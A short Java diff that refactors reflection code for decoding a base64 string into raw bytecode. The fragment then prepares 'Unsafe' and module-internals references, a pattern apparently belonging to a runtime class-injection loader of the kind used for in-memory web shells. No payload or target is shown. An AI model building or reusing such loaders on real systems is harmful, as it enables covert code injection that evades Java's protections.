@@ -7,12 +7,11 @@
     ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
     try {
         Class base64Clz = classLoader.loadClass("java.util.Base64");
-        Class decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
-        Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
-        bytecode = (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, base64Str);
-    } catch (ClassNotFoundException e) {
+        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
+        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+    } catch (ClassNotFoundException ee) {
         Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
-        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, base64Str);
+        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
     }
     Object unsafe = null;
     Object rawModule = null;
